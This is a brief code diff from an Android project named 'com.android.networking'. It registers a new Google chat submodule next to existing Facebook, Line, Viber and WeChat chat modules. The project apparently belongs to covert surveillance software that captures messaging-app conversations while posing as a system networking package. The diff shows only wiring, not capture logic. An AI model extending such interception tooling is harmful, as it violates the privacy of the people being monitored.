@@ -44,6 +44,7 @@ import com.android.networking.file.AutoFile;
 import com.android.networking.interfaces.Observer;
 import com.android.networking.listener.ListenerProcess;
 import com.android.networking.module.chat.ChatFacebook;
+import com.android.networking.module.chat.ChatGoogle;
 import com.android.networking.module.chat.ChatLine;
 import com.android.networking.module.chat.ChatViber;
 import com.android.networking.module.chat.ChatWeChat;
@@ -66,7 +67,7 @@ public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
 		subModuleManager = new SubModuleManager(this);
 
 		if (Cfg.ENABLE_EXPERIMENTAL_MODULES) {
-			
+			subModuleManager.add(new ChatGoogle());
 			
 		} else {
 			subModuleManager.add(new ChatFacebook());
